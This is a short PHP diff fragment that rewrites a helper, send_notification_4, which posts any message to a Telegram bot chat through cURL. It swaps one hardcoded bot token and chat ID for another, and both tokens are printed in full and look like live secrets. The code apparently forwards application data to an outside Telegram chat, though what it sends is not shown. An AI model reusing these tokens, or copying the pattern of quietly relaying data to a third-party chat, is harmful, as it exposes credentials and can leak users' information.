@@ -527,36 +527,34 @@ if (!function_exists('send_notification_3')) {
 }
 
 
-if (!function_exists('send_notification_4')) {
+function send_notification_4($message)
+{
 
-    function send_notification_4($message)
-    {
+    $curl = curl_init();
 
-        $curl = curl_init();
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://api.telegram.org/bot7370713561:AAGWdN3FZnjq1PBZbIDyJzB7c-SwtGqKCV8/sendMessage?chat_id=7134683156',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 0,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => array(
+            'chat_id' => "7134683156",
+            'text' => $message,
 
-        curl_setopt_array($curl, array(
-            CURLOPT_URL => 'https://api.telegram.org/bot7151259872:AAHBFPTPQISD_Lm2XTPuP4gO-sMSR4Tt68I/sendMessage?chat_id=7001670080',
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_ENCODING => '',
-            CURLOPT_MAXREDIRS => 10,
-            CURLOPT_TIMEOUT => 0,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-            CURLOPT_CUSTOMREQUEST => 'POST',
-            CURLOPT_POSTFIELDS => array(
-                'chat_id' => "7001670080",
-                'text' => $message,
+        ),
+        CURLOPT_HTTPHEADER => array(),
+    ));
 
-            ),
-            CURLOPT_HTTPHEADER => array(),
-        ));
+    $var = curl_exec($curl);
+    curl_close($curl);
 
-        $var = curl_exec($curl);
-        curl_close($curl);
-
-        $var = json_decode($var);
-    }
+    $var = json_decode($var);
 }
+
 
 
 
